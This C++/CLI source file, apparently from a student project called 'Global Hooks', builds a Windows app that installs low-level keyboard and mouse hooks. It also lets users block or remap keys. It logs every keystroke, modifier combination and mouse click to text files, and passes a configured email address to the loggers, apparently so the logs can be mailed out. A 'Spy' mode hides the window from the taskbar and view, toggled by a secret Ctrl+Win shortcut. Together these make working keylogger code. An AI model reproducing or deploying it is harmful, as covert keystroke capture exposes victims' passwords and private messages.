#pragma once
#include <windows.h>
#include <msclr\marshal_cppstd.h>
#include "ConfigForm.h"
#include "KeyHook.h"
#include "Logger.h"
#include "ConfigFile.h"
#include "RemapDialog.h"
#define LOGGER_KEYBOARD L"KeyboardLog.txt"
#define LOGGER_MOUSE L"MouseLog.txt"
#define ACTION_BLOCK "Block"
#define ACTION_REMAP "Remap"
#define MODE_SPY 0
#define MODE_DEFAULT 1
#define NO_REMAP -1
#pragma comment (lib, "User32.lib")
namespace GlobalHooks {

	using namespace System;
	using namespace System::ComponentModel;
	using namespace System::Collections;
	using namespace System::Windows::Forms;
	using namespace System::Data;
	using namespace System::Drawing;
	using namespace System::Runtime::InteropServices;

	public ref class MainWindow : public System::Windows::Forms::Form
	{
	public:
		static property MainWindow ^ Instance { MainWindow^ get() { return instance; } }

	protected:
		~MainWindow()
		{
			if (keyboardHook)
				delete keyboardHook;
			if (keyboardLogger)
				delete keyboardLogger;
			if (mouseLogger)
				delete mouseLogger;
			if (configFile)
				delete configFile;
			UnhookWindowsHookEx(keyboardHookHandle);
			if (components)
			{
				delete components;
			}
		}
		
		void SpyMode()
		{
			this->ShowInTaskbar = false;
			this->Visible = false;
			this->Hide();
			this->WindowState = System::Windows::Forms::FormWindowState::Minimized;
		}

		void DefaultMode()
		{
			this->ShowInTaskbar = true;
			this->WindowState = System::Windows::Forms::FormWindowState::Normal;
		}

		static IntPtr MouseProc(int nCode, WPARAM wParam,
			LPARAM lParam)
		{
			MSLLHOOKSTRUCT hookedMouse = *((MSLLHOOKSTRUCT*)lParam);
			if (wParam == WM_LBUTTONDOWN)
			{
				string logMessage;
				logMessage.append("LBUTTON was pressed:");
				logMessage.append(" X: " + to_string(hookedMouse.pt.x));
				logMessage.append(" Y: " + to_string(hookedMouse.pt.y));
				mouseLogger->addMessage(logMessage);
			}
			if (wParam == WM_RBUTTONDOWN)
			{
				string logMessage;
				logMessage.append("RBUTTON was pressed:");
				logMessage.append(" X: " + to_string(hookedMouse.pt.x));
				logMessage.append(" Y: " + to_string(hookedMouse.pt.y));
				mouseLogger->addMessage(logMessage);
			}
			return (IntPtr)CallNextHookEx(mouseHookHandle, nCode, wParam, lParam);
		}

		static IntPtr KeyboardProc(int nCode, WPARAM wParam,
			LPARAM lParam)
		{
			bool shiftState = false;
			bool ctrlState = false;
			bool winState = false;
			if (GetAsyncKeyState(VK_LSHIFT) & (1 << 15))
				shiftState = true;
			if (GetAsyncKeyState(VK_CONTROL) & (1 << 15))
				ctrlState = true;
			if (GetAsyncKeyState(VK_LWIN) & (1 << 15))
				winState = true;
			//Alt
			if (wParam == WM_SYSKEYDOWN)
			{
				string mes("Alt was pressed.");
				keyboardLogger->addMessage(mes);
			}
			KBDLLHOOKSTRUCT hookedKey = *((KBDLLHOOKSTRUCT*)lParam);
			//Alt + smth
			if (wParam == WM_SYSKEYUP)
			{
				string mes;
				string pressedKey = keyboardHook->getNameFromStr(hookedKey);
				mes.append("Alt + ");
				mes.append(pressedKey);
				mes.append(" was pressed.");
				keyboardLogger->addMessage(mes);
			}
			//Any other
			if (wParam == WM_KEYDOWN)
			{
				if (shiftState || ctrlState || winState)
				{
					string mes;
					if (shiftState)
						mes.append("Shift + ");
					if (ctrlState)
						mes.append("Ctrl + ");
					if (winState)
						mes.append("WIN + ");
					string pressedKey = keyboardHook->getNameFromStr(hookedKey);
					if (pressedKey == "" && hookedKey.vkCode == 91)
						pressedKey.append("WIN");
					mes.append(pressedKey);
					mes.append(" was pressed.");
					keyboardLogger->addMessage(mes);
					if (winState && ctrlState)
					{
						if (instance->currentMode == MODE_SPY)
						{
							instance->DefaultMode();
							instance->currentMode = MODE_DEFAULT;
						}
						else
						{
							instance->SpyMode();
							instance->currentMode = MODE_SPY;
						}
					}
				}
				else
				{
					string pressedKey = keyboardHook->getNameFromStr(hookedKey);
					if (pressedKey == "" && hookedKey.vkCode == 91)
						pressedKey.append("WIN");
					string logMessage;
					logMessage.append(pressedKey);
					logMessage.append(" was pressed.");
					keyboardLogger->addMessage(logMessage);
				}
			}

			if (keyboardHook->checkBlockForKey(hookedKey.vkCode))
			{
				return (IntPtr)-1;
			}
			DWORD remap = keyboardHook->checkRemapForKey(hookedKey.vkCode);
			if (remap != NO_REMAP)
			{
				if (wParam == WM_KEYDOWN)
					keybd_event(remap, 0x1D, KEYEVENTF_EXTENDEDKEY | 0, 0);
				else if (wParam == WM_KEYUP)
					keybd_event(remap, 0x1D, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
				return (IntPtr)-1;
			}
			return (IntPtr) CallNextHookEx(keyboardHookHandle, nCode, wParam, lParam);
		}
		
	private:
		int currentMode;
		static MainWindow ^instance = gcnew MainWindow();
		static KeyHook *keyboardHook;
		static Logger *keyboardLogger;
		static Logger *mouseLogger;
		static HHOOK keyboardHookHandle;
		static HHOOK mouseHookHandle;
		ConfigFile *configFile;
		System::Windows::Forms::ComboBox^  comboKey1;
		System::Windows::Forms::Button^  buttonSetConfig;
		System::Windows::Forms::ComboBox^  comboAction1;
		System::Windows::Forms::Label^  action;
		System::Windows::Forms::ComboBox^  comboKey2;
		System::Windows::Forms::ComboBox^  comboKey3;
		System::Windows::Forms::ComboBox^  comboKey4;
		System::Windows::Forms::ComboBox^  comboKey5;
		System::Windows::Forms::ComboBox^  comboAction2;
		System::Windows::Forms::ComboBox^  comboAction3;
		System::Windows::Forms::ComboBox^  comboAction4;
		System::Windows::Forms::ComboBox^  comboAction5;
		System::Windows::Forms::Label^  key;
		System::ComponentModel::Container ^components;

		MainWindow(void)
		{
			keyboardHook = new KeyHook();
			configFile = new ConfigFile();
			int maxLength = atoi(configFile->getMaxLength().c_str());
			keyboardLogger = new Logger(maxLength, configFile->getEmail(), LOGGER_KEYBOARD);
			mouseLogger = new Logger(maxLength, configFile->getEmail(), LOGGER_MOUSE);
			if (configFile->getMode() == "Spy")
				SpyMode();
			else
				DefaultMode();
			currentMode = configFile->getMode() == "Spy" ? MODE_SPY : MODE_DEFAULT;
			InitializeComponent();
		}

		void InitializeComponent(void)
		{
			this->FormBorderStyle = System::Windows::Forms::FormBorderStyle::FixedSingle;
			keyboardHookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardProc, 0, 0);
			mouseHookHandle = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)MouseProc, 0, 0);
			this->comboKey1 = (gcnew System::Windows::Forms::ComboBox());
			this->buttonSetConfig = (gcnew System::Windows::Forms::Button());
			this->comboAction1 = (gcnew System::Windows::Forms::ComboBox());
			this->action = (gcnew System::Windows::Forms::Label());
			this->comboKey2 = (gcnew System::Windows::Forms::ComboBox());
			this->comboKey3 = (gcnew System::Windows::Forms::ComboBox());
			this->comboKey4 = (gcnew System::Windows::Forms::ComboBox());
			this->comboKey5 = (gcnew System::Windows::Forms::ComboBox());
			this->comboAction2 = (gcnew System::Windows::Forms::ComboBox());
			this->comboAction3 = (gcnew System::Windows::Forms::ComboBox());
			this->comboAction4 = (gcnew System::Windows::Forms::ComboBox());
			this->comboAction5 = (gcnew System::Windows::Forms::ComboBox());
			this->key = (gcnew System::Windows::Forms::Label());
			this->SuspendLayout();
			// 
			// comboKey1
			// 
			this->comboKey1->FormattingEnabled = true;
			this->comboKey1->Location = System::Drawing::Point(58, 66);
			this->comboKey1->Name = L"comboKey1";
			this->comboKey1->Size = System::Drawing::Size(121, 21);
			this->comboKey1->TabIndex = 2;
			// 
			// buttonSetConfig
			// 
			this->buttonSetConfig->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(204)));
			this->buttonSetConfig->Location = System::Drawing::Point(402, 298);
			this->buttonSetConfig->Name = L"buttonSetConfig";
			this->buttonSetConfig->Size = System::Drawing::Size(75, 23);
			this->buttonSetConfig->TabIndex = 3;
			this->buttonSetConfig->Text = L"Set config";
			this->buttonSetConfig->UseVisualStyleBackColor = true;
			// 
			// comboAction1
			// 
			this->comboAction1->FormattingEnabled = true;
			this->comboAction1->Location = System::Drawing::Point(302, 64);
			this->comboAction1->Name = L"comboAction1";
			this->comboAction1->Size = System::Drawing::Size(121, 21);
			this->comboAction1->TabIndex = 4;
			this->comboAction1->DropDownStyle = System::Windows::Forms::ComboBoxStyle::DropDownList;
			// 
			// action
			// 
			this->action->AutoSize = true;
			this->action->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 11, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(204)));
			this->action->Location = System::Drawing::Point(335, 26);
			this->action->Name = L"action";
			this->action->Size = System::Drawing::Size(53, 18);
			this->action->TabIndex = 5;
			this->action->Text = L"Action:";
			// 
			// comboKey2
			// 
			this->comboKey2->FormattingEnabled = true;
			this->comboKey2->Location = System::Drawing::Point(58, 105);
			this->comboKey2->Name = L"comboKey2";
			this->comboKey2->Size = System::Drawing::Size(121, 21);
			this->comboKey2->TabIndex = 6;
			// 
			// comboKey3
			// 
			this->comboKey3->FormattingEnabled = true;
			this->comboKey3->Location = System::Drawing::Point(58, 151);
			this->comboKey3->Name = L"comboKey3";
			this->comboKey3->Size = System::Drawing::Size(121, 21);
			this->comboKey3->TabIndex = 7;
			// 
			// comboKey4
			// 
			this->comboKey4->FormattingEnabled = true;
			this->comboKey4->Location = System::Drawing::Point(58, 194);
			this->comboKey4->Name = L"comboKey4";
			this->comboKey4->Size = System::Drawing::Size(121, 21);
			this->comboKey4->TabIndex = 8;
			// 
			// comboKey5
			// 
			this->comboKey5->FormattingEnabled = true;
			this->comboKey5->Location = System::Drawing::Point(58, 238);
			this->comboKey5->Name = L"comboKey5";
			this->comboKey5->Size = System::Drawing::Size(121, 21);
			this->comboKey5->TabIndex = 9;
			// 
			// comboAction2
			// 
			this->comboAction2->FormattingEnabled = true;
			this->comboAction2->Location = System::Drawing::Point(302, 105);
			this->comboAction2->Name = L"comboAction2";
			this->comboAction2->Size = System::Drawing::Size(121, 21);
			this->comboAction2->TabIndex = 10;
			this->comboAction2->DropDownStyle = System::Windows::Forms::ComboBoxStyle::DropDownList;
			// 
			// comboAction3
			// 
			this->comboAction3->FormattingEnabled = true;
			this->comboAction3->Location = System::Drawing::Point(302, 151);
			this->comboAction3->Name = L"comboAction3";
			this->comboAction3->Size = System::Drawing::Size(121, 21);
			this->comboAction3->TabIndex = 11;
			this->comboAction3->DropDownStyle = System::Windows::Forms::ComboBoxStyle::DropDownList;
			// 
			// comboAction4
			// 
			this->comboAction4->FormattingEnabled = true;
			this->comboAction4->Location = System::Drawing::Point(302, 194);
			this->comboAction4->Name = L"comboAction4";
			this->comboAction4->Size = System::Drawing::Size(121, 21);
			this->comboAction4->TabIndex = 12;
			this->comboAction4->DropDownStyle = System::Windows::Forms::ComboBoxStyle::DropDownList;
			// 
			// comboAction5
			// 
			this->comboAction5->FormattingEnabled = true;
			this->comboAction5->Location = System::Drawing::Point(302, 238);
			this->comboAction5->Name = L"comboAction5";
			this->comboAction5->Size = System::Drawing::Size(121, 21);
			this->comboAction5->TabIndex = 13;
			this->comboAction5->DropDownStyle = System::Windows::Forms::ComboBoxStyle::DropDownList;
			// 
			// key
			// 
			this->key->AutoSize = true;
			this->key->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 11, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(204)));
			this->key->Location = System::Drawing::Point(96, 26);
			this->key->Name = L"key";
			this->key->Size = System::Drawing::Size(53, 18);
			this->key->TabIndex = 14;
			this->key->Text = L"Key:";
			// 
			// MainWindow
			// 
			this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
			this->ClientSize = System::Drawing::Size(489, 326);
			this->Controls->Add(this->key);
			this->Controls->Add(this->comboAction5);
			this->Controls->Add(this->comboAction4);
			this->Controls->Add(this->comboAction3);
			this->Controls->Add(this->comboAction2);
			this->Controls->Add(this->comboKey5);
			this->Controls->Add(this->comboKey4);
			this->Controls->Add(this->comboKey3);
			this->Controls->Add(this->comboKey2);
			this->Controls->Add(this->action);
			this->Controls->Add(this->comboAction1);
			this->Controls->Add(this->buttonSetConfig);
			this->Controls->Add(this->comboKey1);
			this->Name = L"MainWindow";
			this->Text = L"Global Hooks";
			this->ResumeLayout(false);
			this->PerformLayout();
			comboKey1->Items->AddRange(Enum::GetNames(Keys::typeid));
			comboKey1->Items->Remove("ShiftKey");
			comboKey1->Items->Remove("Alt");
			comboKey1->Items->Remove("Shift");
			comboKey1->Items->Remove("LShiftKey");
			comboKey1->DropDownStyle = System::Windows::Forms::ComboBoxStyle::DropDownList;
			comboKey1->SelectedIndex = 0;
			comboKey2->Items->AddRange(Enum::GetNames(Keys::typeid));
			comboKey2->DropDownStyle = System::Windows::Forms::ComboBoxStyle::DropDownList;
			comboKey2->SelectedIndex = 0;
			comboKey2->Items->Remove("ShiftKey");
			comboKey2->Items->Remove("Alt");
			comboKey2->Items->Remove("Shift");
			comboKey2->Items->Remove("LShiftKey");
			comboKey3->Items->AddRange(Enum::GetNames(Keys::typeid));
			comboKey3->DropDownStyle = System::Windows::Forms::ComboBoxStyle::DropDownList;
			comboKey3->SelectedIndex = 0;
			comboKey3->Items->Remove("ShiftKey");
			comboKey3->Items->Remove("Alt");
			comboKey3->Items->Remove("Shift");
			comboKey3->Items->Remove("LShiftKey");
			comboKey4->Items->AddRange(Enum::GetNames(Keys::typeid));
			comboKey4->DropDownStyle = System::Windows::Forms::ComboBoxStyle::DropDownList;
			comboKey4->SelectedIndex = 0;
			comboKey4->Items->Remove("ShiftKey");
			comboKey4->Items->Remove("Alt");
			comboKey4->Items->Remove("Shift");
			comboKey4->Items->Remove("LShiftKey");
			comboKey5->Items->AddRange(Enum::GetNames(Keys::typeid));
			comboKey5->DropDownStyle = System::Windows::Forms::ComboBoxStyle::DropDownList;
			comboKey5->SelectedIndex = 0;
			comboKey5->Items->Remove("ShiftKey");
			comboKey5->Items->Remove("Alt");
			comboKey5->Items->Remove("Shift");
			comboKey5->Items->Remove("LShiftKey");
			comboAction1->Items->Add("-");
			comboAction1->Items->Add(ACTION_BLOCK);
			comboAction1->Items->Add(ACTION_REMAP);
			comboAction1->SelectedIndex = 0;
			comboAction2->Items->Add("-");
			comboAction2->Items->Add(ACTION_BLOCK);
			comboAction2->Items->Add(ACTION_REMAP);
			comboAction2->SelectedIndex = 0;
			comboAction3->Items->Add("-");
			comboAction3->Items->Add(ACTION_BLOCK);
			comboAction3->Items->Add(ACTION_REMAP);
			comboAction3->SelectedIndex = 0;
			comboAction4->Items->Add("-");
			comboAction4->Items->Add(ACTION_BLOCK);
			comboAction4->Items->Add(ACTION_REMAP);
			comboAction4->SelectedIndex = 0;
			comboAction5->Items->Add("-");
			comboAction5->Items->Add(ACTION_BLOCK);
			comboAction5->Items->Add(ACTION_REMAP);
			comboAction5->SelectedIndex = 0;
			comboAction1->SelectedValueChanged += gcnew System::EventHandler(this, &MainWindow::ComboAction1Changed);
			comboAction2->SelectedValueChanged += gcnew System::EventHandler(this, &MainWindow::ComboAction2Changed);
			comboAction3->SelectedValueChanged += gcnew System::EventHandler(this, &MainWindow::ComboAction3Changed);
			comboAction4->SelectedValueChanged += gcnew System::EventHandler(this, &MainWindow::ComboAction4Changed);
			comboAction5->SelectedValueChanged += gcnew System::EventHandler(this, &MainWindow::ComboAction5Changed);
			comboKey1->Enter += gcnew System::EventHandler(this, &MainWindow::ComboKey1Enter);
			comboKey2->Enter += gcnew System::EventHandler(this, &MainWindow::ComboKey1Enter);
			comboKey3->Enter += gcnew System::EventHandler(this, &MainWindow::ComboKey1Enter);
			comboKey4->Enter += gcnew System::EventHandler(this, &MainWindow::ComboKey1Enter);
			comboKey5->Enter += gcnew System::EventHandler(this, &MainWindow::ComboKey1Enter);
			comboKey1->SelectedValueChanged += gcnew System::EventHandler(this, &MainWindow::ComboKey1Changed);
			comboKey2->SelectedValueChanged += gcnew System::EventHandler(this, &MainWindow::ComboKey2Changed);
			comboKey3->SelectedValueChanged += gcnew System::EventHandler(this, &MainWindow::ComboKey3Changed);
			comboKey4->SelectedValueChanged += gcnew System::EventHandler(this, &MainWindow::ComboKey4Changed);
			comboKey5->SelectedValueChanged += gcnew System::EventHandler(this, &MainWindow::ComboKey5Changed);
			buttonSetConfig->Click += gcnew EventHandler(this, &MainWindow::ButtonSetConfigPressed);
		}

		void ComboAction1Changed(System::Object^  sender, System::EventArgs^ e)
		{
			String ^value = (String ^)comboAction1->SelectedItem;
			String ^key = (String ^)comboKey1->SelectedItem;
			if (value == ACTION_BLOCK)
			{
				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, key);
				keyboardHook->deleteRemap((DWORD)keyCode);
				keyboardHook->addBlock((DWORD)keyCode);
			}
			if (value == "-")
			{
				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, key);
				keyboardHook->deleteBlock((DWORD)keyCode);
				keyboardHook->deleteRemap((DWORD)keyCode);
			}
			if (value == ACTION_REMAP)
			{
				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, key);
				keyboardHook->deleteBlock((DWORD)keyCode);
				Iapd_GlobalHooks::RemapDialog ^dialog = gcnew Iapd_GlobalHooks::RemapDialog();
				if (dialog->Show())
				{
					String ^value = (String ^)comboKey1->SelectedItem;
					Keys key1 = (Keys)Enum::Parse(Keys::typeid, value);
					Keys key2 = dialog->GetKey();
					keyboardHook->addRemap((DWORD)key1, (DWORD)key2);
				}
				else
					comboAction1->SelectedIndex = 0;
			}
		}

		void ComboAction2Changed(System::Object^  sender, System::EventArgs^ e)
		{
			String ^value = (String ^)comboAction2->SelectedItem;
			String ^key = (String ^)comboKey2->SelectedItem;
			if (value == ACTION_BLOCK)
			{
				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, key);
				keyboardHook->deleteRemap((DWORD)keyCode);
				keyboardHook->addBlock((DWORD)keyCode);
			}
			if (value == "-")
			{
				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, key);
				keyboardHook->deleteBlock((DWORD)keyCode);
				keyboardHook->deleteRemap((DWORD)keyCode);
			}
			if (value == ACTION_REMAP)
			{
				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, key);
				keyboardHook->deleteBlock((DWORD)keyCode);
				Iapd_GlobalHooks::RemapDialog ^dialog = gcnew Iapd_GlobalHooks::RemapDialog();
				if (dialog->Show())
				{
					String ^value = (String ^)comboKey1->SelectedItem;
					Keys key1 = (Keys)Enum::Parse(Keys::typeid, value);
					Keys key2 = dialog->GetKey();
					keyboardHook->addRemap((DWORD)key1, (DWORD)key2);
				}
				else
					comboAction2->SelectedIndex = 0;
			}
		}

		void ComboAction3Changed(System::Object^  sender, System::EventArgs^ e)
		{
			String ^value = (String ^)comboAction3->SelectedItem;
			String ^key = (String ^)comboKey3->SelectedItem;
			if (value == ACTION_BLOCK)
			{
				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, key);
				keyboardHook->deleteRemap((DWORD)keyCode);
				keyboardHook->addBlock((DWORD)keyCode);
			}
			if (value == "-")
			{
				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, key);
				keyboardHook->deleteBlock((DWORD)keyCode);
				keyboardHook->deleteRemap((DWORD)keyCode);
			}
			if (value == ACTION_REMAP)
			{
				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, key);
				keyboardHook->deleteBlock((DWORD)keyCode);
				Iapd_GlobalHooks::RemapDialog ^dialog = gcnew Iapd_GlobalHooks::RemapDialog();
				if (dialog->Show())
				{
					String ^value = (String ^)comboKey1->SelectedItem;
					Keys key1 = (Keys)Enum::Parse(Keys::typeid, value);
					Keys key2 = dialog->GetKey();
					keyboardHook->addRemap((DWORD)key1, (DWORD)key2);
				}
				else
					comboAction3->SelectedIndex = 0;
			}
		}

		void ComboAction4Changed(System::Object^  sender, System::EventArgs^ e)
		{
			String ^value = (String ^)comboAction4->SelectedItem;
			String ^key = (String ^)comboKey4->SelectedItem;
			if (value == ACTION_BLOCK)
			{
				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, key);
				keyboardHook->deleteRemap((DWORD)keyCode);
				keyboardHook->addBlock((DWORD)keyCode);
			}
			if (value == "-")
			{
				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, key);
				keyboardHook->deleteBlock((DWORD)keyCode);
				keyboardHook->deleteRemap((DWORD)keyCode);
			}
			if (value == ACTION_REMAP)
			{
				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, key);
				keyboardHook->deleteBlock((DWORD)keyCode);
				Iapd_GlobalHooks::RemapDialog ^dialog = gcnew Iapd_GlobalHooks::RemapDialog();
				if (dialog->Show())
				{
					String ^value = (String ^)comboKey1->SelectedItem;
					Keys key1 = (Keys)Enum::Parse(Keys::typeid, value);
					Keys key2 = dialog->GetKey();
					keyboardHook->addRemap((DWORD)key1, (DWORD)key2);
				}
				else
					comboAction4->SelectedIndex = 0;
			}
		}

		void ComboAction5Changed(System::Object^  sender, System::EventArgs^ e)
		{
			String ^value = (String ^)comboAction5->SelectedItem;
			String ^key = (String ^)comboKey5->SelectedItem;
			if (value == ACTION_BLOCK)
			{
				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, key);
				keyboardHook->deleteRemap((DWORD)keyCode);
				keyboardHook->addBlock((DWORD)keyCode);
			}
			if (value == "-")
			{
				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, key);
				keyboardHook->deleteBlock((DWORD)keyCode);
				keyboardHook->deleteRemap((DWORD)keyCode);
			}
			if (value == ACTION_REMAP)
			{
				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, key);
				keyboardHook->deleteBlock((DWORD)keyCode);
				Iapd_GlobalHooks::RemapDialog ^dialog = gcnew Iapd_GlobalHooks::RemapDialog();
				if (dialog->Show())
				{
					String ^value = (String ^)comboKey1->SelectedItem;
					Keys key1 = (Keys)Enum::Parse(Keys::typeid, value);
					Keys key2 = dialog->GetKey();
					keyboardHook->addRemap((DWORD)key1, (DWORD)key2);
				}
				else
					comboAction5->SelectedIndex = 0;
			}
		}

		void ComboKey1Enter(System::Object^  sender, System::EventArgs^ e)
		{
			String ^value = (String ^)((ComboBox ^)sender)->SelectedItem;
			if (value != nullptr)
			{
				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, value);
				keyboardHook->deleteBlock((DWORD)keyCode);
				keyboardHook->deleteRemap((DWORD)keyCode);
			}
		}

		void ComboKey1Changed(System::Object^  sender, System::EventArgs^ e)
		{
			String ^keyValue = (String ^)comboKey1->SelectedItem;
			String ^actionValue = (String ^)comboAction1->SelectedItem;
			if (actionValue == ACTION_BLOCK)
			{
				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, keyValue);
				keyboardHook->addBlock((DWORD)keyCode);
			}
			if (actionValue == ACTION_REMAP)
			{
				Iapd_GlobalHooks::RemapDialog ^dialog = gcnew Iapd_GlobalHooks::RemapDialog();
				if (dialog->Show())
				{
					String ^value = (String ^)comboKey1->SelectedItem;
					Keys key1 = (Keys)Enum::Parse(Keys::typeid, value);
					Keys key2 = dialog->GetKey();
					keyboardHook->addRemap((DWORD)key1, (DWORD)key2);
				}
				else
					comboAction1->SelectedIndex = 0;
			}
		}

		void ComboKey2Changed(System::Object^  sender, System::EventArgs^ e)
		{
			String ^keyValue = (String ^)comboKey2->SelectedItem;
			String ^actionValue = (String ^)comboAction2->SelectedItem;
			if (actionValue == ACTION_BLOCK)
			{
				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, keyValue);
				keyboardHook->addBlock((DWORD)keyCode);
			}
			if (actionValue == ACTION_REMAP)
			{
				Iapd_GlobalHooks::RemapDialog ^dialog = gcnew Iapd_GlobalHooks::RemapDialog();
				if (dialog->Show())
				{
					String ^value = (String ^)comboKey2->SelectedItem;
					Keys key1 = (Keys)Enum::Parse(Keys::typeid, value);
					Keys key2 = dialog->GetKey();
					keyboardHook->addRemap((DWORD)key1, (DWORD)key2);
				}
				else
					comboAction2->SelectedIndex = 0;
			}
		}

		void ComboKey3Changed(System::Object^  sender, System::EventArgs^ e)
		{
			String ^keyValue = (String ^)comboKey3->SelectedItem;
			String ^actionValue = (String ^)comboAction3->SelectedItem;
			if (actionValue == ACTION_BLOCK)
			{
				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, keyValue);
				keyboardHook->addBlock((DWORD)keyCode);
			}
			if (actionValue == ACTION_REMAP)
			{
				Iapd_GlobalHooks::RemapDialog ^dialog = gcnew Iapd_GlobalHooks::RemapDialog();
				if (dialog->Show())
				{
					String ^value = (String ^)comboKey3->SelectedItem;
					Keys key1 = (Keys)Enum::Parse(Keys::typeid, value);
					Keys key2 = dialog->GetKey();
					keyboardHook->addRemap((DWORD)key1, (DWORD)key2);
				}
				else
					comboAction3->SelectedIndex = 0;
			}
		}

		void ComboKey4Changed(System::Object^  sender, System::EventArgs^ e)
		{
			String ^keyValue = (String ^)comboKey4->SelectedItem;
			String ^actionValue = (String ^)comboAction4->SelectedItem;
			if (actionValue == ACTION_BLOCK)
			{
				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, keyValue);
				keyboardHook->addBlock((DWORD)keyCode);
			}
			if (actionValue == ACTION_REMAP)
			{
				Iapd_GlobalHooks::RemapDialog ^dialog = gcnew Iapd_GlobalHooks::RemapDialog();
				if (dialog->Show())
				{
					String ^value = (String ^)comboKey4->SelectedItem;
					Keys key1 = (Keys)Enum::Parse(Keys::typeid, value);
					Keys key2 = dialog->GetKey();
					keyboardHook->addRemap((DWORD)key1, (DWORD)key2);
				}
				else
					comboAction4->SelectedIndex = 0;
			}
		}

		void ComboKey5Changed(System::Object^  sender, System::EventArgs^ e)
		{
			String ^keyValue = (String ^)comboKey5->SelectedItem;
			String ^actionValue = (String ^)comboAction5->SelectedItem;
			if (actionValue == ACTION_BLOCK)
			{
				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, keyValue);
				keyboardHook->addBlock((DWORD)keyCode);
			}
			if (actionValue == ACTION_REMAP)
			{
				Iapd_GlobalHooks::RemapDialog ^dialog = gcnew Iapd_GlobalHooks::RemapDialog();
				if (dialog->Show())
				{
					String ^value = (String ^)comboKey5->SelectedItem;
					Keys key1 = (Keys)Enum::Parse(Keys::typeid, value);
					Keys key2 = dialog->GetKey();
					keyboardHook->addRemap((DWORD)key1, (DWORD)key2);
				}
				else
					comboAction5->SelectedIndex = 0;
			}
		}

		void ButtonSetConfigPressed(System::Object^  sender, EventArgs^ e)
		{
			Iapd_GlobalHooks::ConfigForm ^form = gcnew Iapd_GlobalHooks::ConfigForm();
			form->SetMail(gcnew String(configFile->getEmail().c_str()));
			form->SetMode(gcnew String(configFile->getMode().c_str()));
			form->SetMaxLength(gcnew String(configFile->getMaxLength().c_str()));
			if (form->Show())
			{
				string unmanagedEmail = form->GetEmail();
				string unmanagedMode = form->GetMode();
				string unmanagedMaxLength = form->GetMaxLength();
				configFile->setNewValues(unmanagedMode, unmanagedEmail, unmanagedMaxLength);
				int maxLength = atoi(configFile->getMaxLength().c_str());
				delete keyboardLogger;
				delete mouseLogger;
				keyboardLogger = new Logger(maxLength, configFile->getEmail(), LOGGER_KEYBOARD);
				mouseLogger = new Logger(maxLength, configFile->getEmail(), LOGGER_MOUSE);
			}
		}
	};
}
